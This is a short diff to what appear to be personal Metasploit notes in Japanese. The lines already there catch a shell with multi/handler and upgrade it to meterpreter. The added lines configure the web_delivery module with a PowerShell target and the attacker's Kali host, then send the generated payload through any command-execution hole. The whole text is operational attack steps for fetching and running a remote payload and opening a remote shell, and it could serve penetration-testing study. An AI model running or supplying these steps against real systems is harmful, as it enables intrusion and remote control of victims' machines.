@@ -12,3 +12,11 @@ use exploit/multi/handrer
 //meterpreterで張替え
 use multi/manage/shell_to_meterpreter #最初のシェルをバックグラウンドにしてから
 run session=<num>
+
+//送信用ペイロード作成
+use exploit multi/script/web_delivery
+set payload <payload>
+set target PSH #ターゲットを選ぶ。PHPやPythonなどがある。PSHはパワーシェルコマンド
+set lhost <kali IP>
+set srvhost <kali IP>
+runするとペイロードが表示されるのでそれをPoC等コマンド実行できるもので送信する
